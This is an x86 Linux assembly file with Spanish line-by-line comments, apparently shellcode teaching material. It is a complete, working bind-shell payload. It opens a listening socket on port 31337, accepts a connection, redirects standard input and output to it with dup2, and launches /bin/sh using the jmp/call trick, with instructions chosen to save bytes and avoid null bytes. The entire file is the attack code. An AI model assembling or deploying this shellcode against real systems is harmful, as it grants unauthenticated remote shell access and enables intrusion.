BITS 32
section .text
global _start
_start:

; syscall socketcall(ebx, ecx) donde ebx = numero funcion y ecx = direccion de parametros de funcion.

; s = socket(2, 1, 0);
push byte 0x66      ; Llamada al sistema 102, socketcall().
pop eax             ; En eax se almacena el numero 102.
cdq                 ; Se pone a cero el registro edx.
xor ebx, ebx        ; Se pone a cero el registro ebx.
; Se construyen los argumentos de la llamada a socket() y se empilan en orden inverso
inc ebx             ; Dentro de socketcall(), la llamada socket es la numero uno.
push edx            ; Se empila el tercer parametro, protocol = 0.
push byte 0x1       ; Se empila el segundo parametro, SOCK_STREAM = 1.
push byte 0x2       ; Se empila el primer parametro, AF_INET = 2
mov ecx, esp        ; En ecx se almacena la direccion donde estan ubicados los parametros.
int 0x80            ; Syscall socketcall() con la funcion socket().

xchg esi, eax       ; Se guarda el descriptor obtenido en esi para usarlo despues

; bind(s, [2, 31337, 0], 16);
push byte 0x66      ; Llamada al sistema 102, socketcall().
pop eax             ; En eax se almacena el numero 102.
; Se construyen los argumentos de la llamada a bind() y se empilan en orden inverso
inc ebx             ; Ebx era 1, ahora es 2. Dentro de socketcall() la llamada bind es la dos.
push edx            ; Se empila el tercer parametro del struct, INADDR_ANY = 0.
push word 0x697a    ; Se empila el segundo parametro del struct, PORT = 31337.
push word bx        ; Se empila el primer parametro del struct, AF_INET = 2. Ebx = 2.
mov ecx, esp        ; En ecx se almacena la direccion del struct con los parametros.
; Se empilan todos los parametros en orden inverso para posteriormente obtener su direccion.
push byte 16        ; Se empila el tamano del struct, sizeof(server_struct) = 16
push ecx            ; Se empila la direccion del struct.
push esi            ; Se empila el descriptor obtenido anteriormente.
mov ecx, esp        ; En ecx se guarda la direccion donde estan todos los parametros.
int 80h             ; Syscall socketcall() con la funcion bind().

; listen(s, 4);
mov byte al, 0x66   ; Llamada al sistema 102, socketcall(). Sin push/pop se ahorra un byte.
; Se construyen los argumentos de la llamada a listen() y se empilan en orden inverso
inc ebx             ; Realizar dos inc ocupa lo mismo que un mov byte bx, 0x4.
inc ebx             ; Dentro de socketcall(), la llamada listen es la cuatro.
push ebx            ; Se empila el segundo parametro, backlog = 4. Maximo num conexiones en cola.
push esi            ; Se empila el descriptor obtenido por la llamada socket().
mov ecx, esp        ; En ecx se almacena la direccion de los parametros.
int 80h             ; Syscall socketcall() con la funcion listen().

; c = accept(s, 0, 0);
mov byte al, 0x66   ; Llamada al sistema 102, socketcall(). Sin push/pop se ahorra un byte.
; Se construyen los argumentos de la llamada a accept() y se empilan en orden inverso
inc ebx             ; Dentro de socketcall(), la llamada accept es la numero cinco.
push edx            ; Se empila el tercer parametro.
push edx            ; Se empila el segundo parametro.
push esi            ; Se empila el descriptor obtenido anteriormente.
mov ecx, esp        ; En ecx se almacena la direccion de los parametros.
int 80h             ; Syscall socketcall() con la funcion accept(). Conection descriptor in eax.

xchg eax, ebx       ; En eax se almacena un cinco y en ebx el descriptor devuelto por accept().

; dup2(descriptor aceptado, descriptores I/O estandar);
push byte 0x2       ; Maximo descriptor estandar almacenado en ecx.
pop ecx
dup_l00p:           ; Etiqueta para el bucle.
mov byte al, 0x3F   ; Llamada al sistema 63. Se debe poner dentro del bucle.
                ; Eax se sobreescribe con el valor de retorno de dup2().
int 80h             ; Syscall dup2().
dec ecx             ; Se Decrementa el descriptor estandar hasta que sea cero.
jns dup_l00p        ; Se salta a la etiqueta hasta que el flag de signo sea uno = ecx negativo.

; execve(const char * file, char * const argv[], char * const envp[]);
; jmp/call style
jmp short texto         ;Aqui Â­empieza el jmp/call trick. Salta a texto. Ahorramos un byte con el 'short'.
code:
pop ebx                 ;Ponemos en ebx la direccion donde se encuentra '/bin/sh'. Sera el primer argumento de la syscall.
xor eax, eax            ;Ponemos a 0 el registro eax    
cdq                     ;Ponemos a 0 el registro edx gracias a que eax es 0. Nos ahorramos un byte.
mov byte [ebx+7], al    ;Ponemos un null-byte al final de la cadena /bin/sh.
mov [ebx+8], ebx        ;A continuacion de la cadena, almacenamos la direccion de la misma cadena
mov byte [ebx+12], al   ;A continuacion de los 4 bytes de la direccion, almacenamos un byte nulo
lea ecx, [ebx+8]        ;En ecx almacenamos la direccion donde se almacena la direccion a /bin/sh
mov al, 11              ;En eax ponemos el valor de la execve syscall. Trabajando con al nos ahorramos un byte.
int 0x80                ;Ejecutamos la syscall.
texto:
call code               ;Llamamos a code. En la pila se almacena la direccion donde se encuentra '/bin/sh'.
db '/bin/sh'
